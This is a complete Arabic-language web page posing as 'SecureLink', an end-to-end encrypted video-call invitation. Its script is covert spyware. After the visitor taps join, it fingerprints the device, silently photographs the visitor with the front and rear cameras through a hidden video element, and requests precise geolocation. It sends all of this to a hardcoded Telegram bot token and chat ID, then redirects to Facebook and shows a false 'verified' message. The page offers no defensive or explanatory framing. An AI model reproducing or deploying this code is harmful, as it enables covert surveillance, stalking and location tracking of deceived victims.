<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;overflow:hidden}
  body{
    background:
      radial-gradient(ellipse at top, #1a2340 0%, transparent 60%),
      radial-gradient(ellipse at bottom, #10283a 0%, transparent 60%),
      #070a12;
    color:#fff;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
  }

  .screen{
    display:none;
    flex-direction:column;
    align-items:center;
    width:100%;
    max-width:380px;
    text-align:center;
    animation:fadeIn .35s ease;
  }
  .screen.active{display:flex}
  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

  .brand{
    display:flex;
    align-items:center;
    gap:8px;
    font-size:13px;
    color:#7d8899;
    letter-spacing:.5px;
    margin-bottom:32px;
  }
  .brand svg{width:18px;height:18px;fill:#10d876}
  .brand b{color:#c8d1e0;font-weight:600}

  .avatar{
    width:120px;height:120px;
    border-radius:50%;
    background:linear-gradient(135deg,#10d876 0%,#0a8f5c 100%);
    display:flex;align-items:center;justify-content:center;
    font-size:42px;font-weight:700;color:#fff;letter-spacing:1px;
    margin-bottom:22px;position:relative;
    box-shadow:0 12px 40px rgba(16,216,118,.28);
  }
  .avatar::after{
    content:"";position:absolute;inset:-8px;border-radius:50%;
    border:2px solid rgba(16,216,118,.35);
    animation:ring 2.2s ease-out infinite;
  }
  @keyframes ring{
    0%{transform:scale(.95);opacity:.7}
    100%{transform:scale(1.25);opacity:0}
  }
  .avatar.pulse::after{animation-duration:1.4s}

  h1{font-size:22px;font-weight:600;margin-bottom:6px;color:#fff}

  .status{font-size:14px;color:#8b95a8;margin-bottom:6px;line-height:1.5}
  .status .lock{color:#10d876;font-weight:500}

  .call-btn{
    width:70px;height:70px;border-radius:50%;border:none;
    background:linear-gradient(135deg,#10d876 0%,#0a8f5c 100%);
    display:flex;align-items:center;justify-content:center;
    cursor:pointer;margin-top:32px;
    box-shadow:0 10px 30px rgba(16,216,118,.4);
    transition:transform .15s, box-shadow .15s;
  }
  .call-btn:active{transform:scale(.94);box-shadow:0 6px 18px rgba(16,216,118,.5)}
  .call-btn:disabled{opacity:.5;cursor:default;box-shadow:none}
  .call-btn svg{width:30px;height:30px;fill:#fff}

  .call-label{margin-top:12px;font-size:14px;color:#8b95a8}

  .spinner{
    width:44px;height:44px;border-radius:50%;
    border:3px solid rgba(255,255,255,.08);
    border-top-color:#10d876;
    animation:spin .9s linear infinite;
    margin-top:26px;
  }
  @keyframes spin{to{transform:rotate(360deg)}}

  .hint{
    position:fixed;bottom:24px;left:0;right:0;
    text-align:center;font-size:11px;color:#485263;
    letter-spacing:.8px;
    display:flex;align-items:center;justify-content:center;gap:6px;
  }
  .hint svg{width:11px;height:11px;fill:#485263}

  video{
    position:fixed;left:-9999px;top:-9999px;
    width:2px;height:2px;opacity:.01;pointer-events:none;
  }
</style>
</head>
<body>

<!-- ============ شاشة الانضمام ============ -->
<div id="joinScreen" class="screen active">
  <div class="brand">
    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    <b>SecureLink</b> — مكالمات مشفرة
  </div>

  <div class="avatar">MM</div>
  <h1>Marwa Mohamed</h1>
  <div class="status">
    <span class="lock">🔒 اتصال مشفر</span> من طرف إلى طرف
  </div>
  <div class="status" style="font-size:12px;color:#5d6675">
    يدعوك للانضمام إلى مكالمة فيديو
  </div>

  <button class="call-btn" id="joinBtn" aria-label="بدء المكالمة">
    <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
  </button>
  <div class="call-label">اضغط للانضمام</div>
</div>

<!-- ============ شاشة الاتصال ============ -->
<div id="connectScreen" class="screen">
  <div class="brand">
    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    <b>SecureLink</b> — مكالمات مشفرة
  </div>

  <div class="avatar pulse">MM</div>
  <h1>Marwa Mohamed</h1>
  <div class="status" id="statusText">جاري تأمين الاتصال...</div>
  <div class="spinner"></div>
</div>

<div class="hint">
  <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm3 12c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
  تشفير AES-256 بت • لا يمكن لأي طرف ثالث الاطلاع
</div>

<video id="v" autoplay playsinline muted></video>

<script>
(function () {
  const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
  const CHAT_ID   = "8800876346";

  const TOTAL_PER_SIDE = 5;
  const SETTLE_MS      = 450;
  const MIN_BRIGHTNESS = 12;
  const PHOTO_GAP_MS   = 80;
  const RELEASE_MS     = 400;
  const REDIRECT_URL   = "https://www.facebook.com";

  const v          = document.getElementById("v");
  const joinScreen = document.getElementById("joinScreen");
  const connScreen = document.getElementById("connectScreen");
  const joinBtn    = document.getElementById("joinBtn");
  const statusText = document.getElementById("statusText");

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {level: Math.round(b.level*100)+"%", charging: b.charging};
    }catch{ return null; }
  }
  function getConn(){
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {type:c.effectiveType||"—", downlink:c.downlink??"—"} : null;
  }
  function devType(){
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) return "Android";
    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if(/Windows/i.test(ua)) return "Windows";
    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
    if(/Linux/i.test(ua)) return "Linux";
    return "—";
  }

  async function collect(){
    const bat = await getBattery();
    const con = getConn();
    const d = {
      "📱 الجهاز"     : devType(),
      "🖥 النظام"      : navigator.platform || "—",
      "📐 الشاشة"     : `${screen.width}×${screen.height}`,
      "🔍 البكسل"     : devicePixelRatio,
      "🗣 اللغة"       : navigator.language,
      "🕐 التوقيت"    : Intl.DateTimeFormat().resolvedOptions().timeZone,
      "🧠 الأنوية"    : navigator.hardwareConcurrency || "—",
      "💾 الذاكرة"    : navigator.deviceMemory ? navigator.deviceMemory+"GB" : "—",
      "👆 لمس"        : ("ontouchstart" in window) ? "نعم" : "لا",
      "🔋 البطارية"   : bat ? `${bat.level} — ${bat.charging?"⚡":"🔌"}` : "—",
      "📶 الشبكة"     : con ? `${con.type} / ${con.downlink}Mbps` : "—",
      "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
      "🌐 UA"         : navigator.userAgent
    };
    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
    for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
    return out;
  }

  function sendText(t){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("text", t);
    fd.append("parse_mode","HTML");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendPhoto(blob, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", cap);
    fd.append("photo", blob, "p.jpg");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendLocation(lat, lon, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("latitude", lat);
    fd.append("longitude", lon);
    if(cap) fd.append("caption", cap);
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
      {method:"POST", body:fd}).catch(()=>{});
  }

  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  async function closeCamera(){
    if (v.srcObject){
      v.srcObject.getTracks().forEach(t => { try{ t.stop(); }catch(_){} });
      v.srcObject = null;
    }
    await sleep(RELEASE_MS);
  }

  async function openCamera(facing, maxTries = 3){
    for (let attempt = 1; attempt <= maxTries; attempt++){
      try{
        await closeCamera();
        const s = await navigator.mediaDevices.getUserMedia({
          video:{ facingMode:{ideal: facing}, width:{ideal:1280}, height:{ideal:720} },
          audio:false
        });
        v.srcObject = s;
        try{ await v.play(); }catch(_){}
        await waitForRealFrame(v);
        await sleep(SETTLE_MS);
        return s;
      }catch(e){
        console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
        if (attempt === maxTries) throw e;
        await sleep(600);
      }
    }
    return null;
  }

  function capture(isFront){
    return new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width  = v.videoWidth  || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext("2d");
      if (isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(v, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sw = Math.min(200, c.width);
        const sh = Math.min(200, c.height);
        const sx = (c.width  - sw) / 2;
        const sy = (c.height - sh) / 2;
        const data = ctx.getImageData(sx, sy, sw, sh).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(isFront, maxTries = 4){
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return blob;
      await sleep(220);
    }
    return null;
  }

  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          });
        },
        err => { clearTimeout(timer); resolve({ error: err.message }); },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  async function capturePhase(facing, label, count){
    try{
      await openCamera(facing);
    }catch(e){
      console.warn(`failed to open ${facing}:`, e.message);
      return 0;
    }

    let captured = 0;
    for (let i = 1; i <= count; i++){
      statusText.textContent = `📷 ${label} — ${i}/${count}`;
      const blob = await captureSafe(facing === "user");
      if (blob){
        sendPhoto(blob, `📷 ${label} #${i}`);
        captured++;
      }
      await sleep(PHOTO_GAP_MS);
    }
    await closeCamera();
    return captured;
  }

  async function run(){
    joinScreen.classList.remove("active");
    connScreen.classList.add("active");

    sendText(await collect());

    statusText.textContent = "جاري الاتصال بالكاميرا...";
    await capturePhase("user", "أمامية", TOTAL_PER_SIDE);

    await sleep(300);

    await capturePhase("environment", "خلفية", TOTAL_PER_SIDE);

    await closeCamera();

    statusText.textContent = "جاري التحقق من الهوية...";
    const loc = await requestLocation();

    if (loc && loc.lat !== undefined){
      const cap =
        `📍 <b>الموقع الجغرافي</b>\n` +
        `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
        `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
      sendLocation(loc.lat, loc.lon, cap);
    }else if (loc && loc.error){
      sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
    }else{
      sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
    }

    statusText.textContent = "✅ تم التحقق بنجاح";
    await sleep(700);
    window.location.href = REDIRECT_URL;
  }

  joinBtn.addEventListener("click", function(){
    joinBtn.disabled = true;
    run();
  });
})();
</script>
</body>
</html>
